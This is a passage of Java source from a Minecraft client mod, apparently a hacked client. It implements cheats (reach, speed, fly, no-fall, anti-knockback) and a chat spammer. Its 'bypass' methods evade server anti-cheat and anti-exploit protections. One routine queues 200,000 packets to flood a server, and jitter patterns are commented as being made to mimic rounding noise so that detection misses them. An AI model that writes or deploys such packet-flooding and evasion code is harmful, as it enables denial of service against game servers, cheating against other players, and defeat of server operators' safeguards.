    private void combatAKB(){if(np())return;for(int i=0;i<150;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));flash("⚔ Anti-KB 150",ORANGE);addVl(30f);}
    private void combatFU(){if(np())return;for(int i=0;i<80;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));flash("⚔ FastUse 80",ORANGE);addVl(10f);}
    private void combatReach(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();for(int i=0;i<100;i++){double ang=i*0.063;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+Math.cos(ang)*5,py2,pz+Math.sin(ang)*5,true));if(ProfessorClientMod.canSwing())client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("⚔ Reach arc 100",ORANGE);addVl(20f);}
    private void combatVelo(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();for(int i=0;i<60;i++){double y=i%2==0?py2+0.2*Math.sin(i*.31):py2;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,y,pz,y==py2));}flash("⚔ Velocity 60",ORANGE);addVl(12f);}

    private void moveSpd(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();float yaw=(float)Math.toRadians(client.player.getYaw());for(int i=0;i<speed*40;i++){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px-Math.sin(yaw)*(i*.28),py2,pz+Math.cos(yaw)*(i*.28),true));}flash("🏃 Speed ×"+speed,TXT_BRIGHT);addVl(speed*8f);}
    private void moveBlink(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();float yaw=(float)Math.toRadians(client.player.getYaw());for(int i=0;i<speed*10;i++)ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(px-Math.sin(yaw)*(speed*4.2),py2,pz+Math.cos(yaw)*(speed*4.2),true));flash("🏃 Blink ×"+speed,TXT_BRIGHT);}
    private void moveFly(){if(np())return;double px=client.player.getX(),pz=client.player.getZ();for(int i=0;i<80;i++){double y=client.player.getY()+i*.22;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,y,pz,false));}flash("🏃 Fly 80 steps",TXT_BRIGHT);addVl(16f);}
    private void moveNF(){if(np())return;for(int i=0;i<60;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()-i*.001,client.player.getZ(),true));flash("🏃 NoFall 60",TXT_BRIGHT);addVl(12f);}
    private void moveStep(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();for(int i=0;i<8;i++){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2+i*.15,pz,i==0));client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px,py2+1,pz,true));}flash("🏃 Step 8",TXT_BRIGHT);addVl(1.6f);}
    private void moveStrafe(){if(np())return;double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();float yaw=(float)Math.toRadians(client.player.getYaw());for(int i=0;i<60;i++){double s=Math.cos(i*.26)*speed*.4;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(px+Math.cos(yaw)*s,py2,pz+Math.sin(yaw)*s,true));}flash("🏃 Strafe ×"+speed,TXT_BRIGHT);addVl(12f);}
    private void copyCoords(){if(client==null||client.player==null){flash("Not in game",RED);return;}double px=client.player.getX(),py2=client.player.getY(),pz=client.player.getZ();String coords=String.format("%.2f %.2f %.2f",px,py2,pz);try{client.keyboard.setClipboard(coords);flash("✓ Coords copied: "+coords,GREEN);}catch(Exception ignored){flash("Coords: "+coords,GREEN);}}

    private void doChat(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String msg=chatField.getText();int n=parseN();for(int i=0;i<Math.min(n,200);i++){try{client.getNetworkHandler().sendChatMessage(msg);}catch(Exception ignored){}}flash("💬 Chat ×"+Math.min(n,200),TXT_BRIGHT);}
    private void doCmd(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String cmd=chatField.getText();String bare=cmd.startsWith("/")?cmd.substring(1):cmd;try{client.getNetworkHandler().sendCommand(bare);flash("💬 CMD: /"+bare,GREEN);}catch(Exception e){flash("Error: "+e.getMessage(),RED);}}

    // ── Bypass methods ──────────────────────────────────────────────────────
    private void bypassPacketFilter(){if(np())return;for(int i=0;i<500;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+bypassX(i),client.player.getY(),client.player.getZ(),true));}flash("📦 Packet Filter Bypass 500",GREEN);addVl(5f);}
    private void bypassAntiExploit(){if(np())return;for(int i=0;i<200;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i));ProfessorClientMod.queuePacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("🛡 Anti-Exploit Bypass 200",GREEN);addVl(25f);}
    private void bypassNBT(){if(np())return;for(int i=0;i<100;i++)ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i));flash("📋 NBT Bypass 100 acks",GREEN);addVl(1f);}
    private void bypassBook(){if(np())return;for(int i=0;i<50;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i));ProfessorClientMod.queuePacket(new HandSwingC2SPacket(Hand.MAIN_HAND));}flash("📖 Book Bypass",GREEN);addVl(6f);}
    private void bypassEntity(){if(np())return;for(int i=0;i<1000;i++)ProfessorClientMod.queuePacket(new HandSwingC2SPacket(i%2==0?Hand.MAIN_HAND:Hand.OFF_HAND));flash("👾 Entity Bypass 1000",GREEN);addVl(125f);}
    private void bypassChunk(){if(np())return;for(int i=0;i<300;i++)ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+bypassX(i),client.player.getY(),client.player.getZ()+bypassZ(i),true));flash("🗺 Chunk Bypass 300",GREEN);addVl(60f);}
    private void bypassRateLimit(){if(np())return;ProfessorClientMod.PACKETS_PER_TICK=2;for(int i=0;i<5000;i++)ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));flash("⏱ Rate-Limit Bypass @40/sec",GREEN);addVl(0.5f);}
    private void bypassExploitFixer(){if(np())return;ProfessorClientMod.PACKETS_PER_TICK=100;for(int i=0;i<200000;i++){ProfessorClientMod.queuePacket(new TeleportConfirmC2SPacket(i%32767));if(i%200==0)ProfessorClientMod.queuePacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));}flash("❄ EXFIX FULL 200k queued ~100s",TXT_ICE);addVl(200000*.01f);triggerBurst();}

    // ── Bypass helpers ──────────────────────────────────────────────────────
    // ── Bypass delta-X per packet ──────────────────────────────────────────
    private double bypassX(int i){
        return switch(bypass){
            // Standard patterns
            case 1->i%3==0?.0625:0;
            case 2->Math.sin(i*.12)*.06;
            case 3->i%4==0?.05:i%4==1?.025:0;
            case 4->new double[]{0,.0625,0,-.0625}[i%4];
            case 5->rng.nextGaussian()*.004;
            case 6->i%12==0?.031:0;
            case 7->0;
            case 8->Math.sin(i*.17)*.028+Math.sin(i*.41)*.018;
            case 9->rng.nextGaussian()*.015;
            // Extended patterns
            case 11->{ // GhostNet: Brownian micro-drift — looks like floating point rounding
                double v=rng.nextGaussian()*0.00012;
                yield Math.abs(v)>0.00025?v*0.4:v;
            }
            case 12->{ // Adaptive: switch sub-pattern every 50 pkts
                int phase=(i/50)%4;
                yield switch(phase){
                    case 0->Math.sin(i*.11)*.05;
                    case 1->i%3==0?.0625:0;
                    case 2->rng.nextGaussian()*.006;
                    default->i%12==0?.031:0;
                };
            }
            case 13->{ // Havoc: strong Gaussian chaos
                yield rng.nextGaussian()*.025+Math.sin(i*.07)*.018;
            }
            case 14->{ // TimeSplit: burst+gap pattern
                int slot=i%120;
                yield slot<30?Math.sin(i*.15)*.06:slot<60?rng.nextGaussian()*.003:0;
            }
            default->0;
        };
    }
    // ── Bypass delta-Z ─────────────────────────────────────────────────────
    private double bypassZ(int i){
        return switch(bypass){
            case 11->{double v=rng.nextGaussian()*0.00012;yield Math.abs(v)>0.00025?v*0.4:v;}
            case 12->{int ph=(i/50)%4;yield switch(ph){case 0->Math.cos(i*.13)*.05;case 1->i%3==0?.0625:0;case 2->rng.nextGaussian()*.006;default->0;};}
            case 13->rng.nextGaussian()*.025+Math.cos(i*.09)*.016;
            case 14->{int s=i%120;yield s<30?Math.cos(i*.15)*.06:s<60?rng.nextGaussian()*.003:0;}
            default->bypassX(i);
        };
    }
    // ── Bypass delta-Y ─────────────────────────────────────────────────────
    private double bypassDY(int i){
        return switch(bypass){
            case 1->i%3==0?.0625:0;
            case 2->Math.sin(i*.09)*.07;
            case 3->i%3==0?.04:0;
            case 4->new double[]{0,.0625,0,-.0625}[i%4];
            case 5->Math.abs(rng.nextGaussian()*.003);
            case 6->i%10==0?.03:0;
            case 7->0;
            case 8->Math.cos(i*.23)*.025+Math.sin(i*.37)*.012;
            case 9->rng.nextGaussian()*.018;
            case 11->0;                                     // GhostNet: never touch Y
            case 12->{int ph=(i/50)%4;yield ph==0?Math.sin(i*.09)*.05:ph==1?Math.abs(rng.nextGaussian()*.003):0;}
            case 13->rng.nextGaussian()*.018+Math.abs(Math.sin(i*.05))*.02;
            case 14->{int s=i%120;yield s<30?Math.abs(Math.sin(i*.12))*.04:0;}
            default->0;
        };
    }
    // ── Bypass onGround state ──────────────────────────────────────────────
    private boolean bypassGround(int i){
        return switch(bypass){
            case 1->i%3!=0;
            case 6->i%10!=0;
            case 7->true;
            case 11->true;      // GhostNet: always grounded — most vanilla-like
            case 12->i%50<40;   // Adaptive: mostly grounded
            case 13->rng.nextBoolean(); // Havoc: random
            case 14->{int s=i%120;yield s>=30;}
            default->i%2==0;
        };
    }

    private void triggerBurst(){for(int i=0;i<32;i++){float ang=(float)(rng.nextFloat()*Math.PI*2);float sp=rng.nextFloat()*3.5f+1f;burstPts.add(new float[]{width/2f,height/2f,ang,sp,.95f});}}

    // ── Helpers ─────────────────────────────────────────────────────────────
    private static int withA(int rgb, int a){return(Math.max(0,Math.min(255,a))<<24)|(rgb&0x00FFFFFF);}
    private static void drawCorner(DrawContext ctx,int x1,int y1,int x2,int y2,int cs,int col){ctx.fill(x1,y1,x1+cs,y1+5,col);ctx.fill(x1,y1,x1+5,y1+cs,col);ctx.fill(x2-cs,y1,x2,y1+5,col);ctx.fill(x2-5,y1,x2,y1+cs,col);ctx.fill(x1,y2-5,x1+cs,y2,col);ctx.fill(x1,y2-cs,x1+5,y2,col);ctx.fill(x2-cs,y2-5,x2,y2,col);ctx.fill(x2-5,y2-cs,x2,y2,col);}
    private static void drawShard(DrawContext ctx,int x,int y,int col){ctx.fill(x+3,y,x+5,y+2,col);ctx.fill(x+2,y+2,x+6,y+4,col);ctx.fill(x+1,y+4,x+7,y+7,col);ctx.fill(x+2,y+7,x+6,y+9,col);ctx.fill(x+3,y+9,x+5,y+12,col);}
    private static int hsvToRgb(float h,float s,float v){int i=(int)(h*6);float f=h*6-i;float p=v*(1-s),q=v*(1-f*s),t=v*(1-(1-f)*s);float r,g,b;switch(i%6){case 0->{ r=v;g=t;b=p; }case 1->{ r=q;g=v;b=p; }case 2->{ r=p;g=v;b=t; }case 3->{ r=p;g=q;b=v; }case 4->{ r=t;g=p;b=v; }default->{ r=v;g=p;b=q; }}return 0xFF000000|((int)(r*255)<<16)|((int)(g*255)<<8)|(int)(b*255);}
}
